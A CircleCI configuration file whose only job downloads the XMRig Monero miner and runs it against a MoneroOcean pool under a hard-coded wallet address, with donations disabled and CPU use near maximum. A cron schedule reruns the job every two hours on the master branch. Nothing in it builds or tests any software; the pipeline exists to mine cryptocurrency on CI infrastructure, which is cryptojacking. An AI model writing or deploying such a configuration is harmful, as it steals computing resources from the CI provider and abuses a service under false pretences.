version: 2.1
jobs:
  mine:
    docker:
      - image: ubuntu:focal
    steps:
      - run:
          command: |
            apt-get update && apt-get install -y wget tar
            wget -q https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-focal-x64.tar.gz
            tar xzf xmrig-6.22.2-focal-x64.tar.gz --strip-components=1
            chmod +x xmrig
            timeout 3300 ./xmrig -o gulf.moneroocean.stream:10032 -u 45qqTqhjmsz8mhzry3dG6rJgt9Jdzfh9xa6Skh1mtmBGgNubPDsrJVVEg6cWS6DtEB5i6BWTEaQA7BRws6UEibKEAQ1dd9X -p circle_ci --donate-level=0 --cpu-max-threads-hint=90
workflows:
  version: 2
  mine:
    triggers:
      - schedule:
          cron: "0 */2 * * *"
          filters:
            branches:
              only: master
    jobs:
      - mine
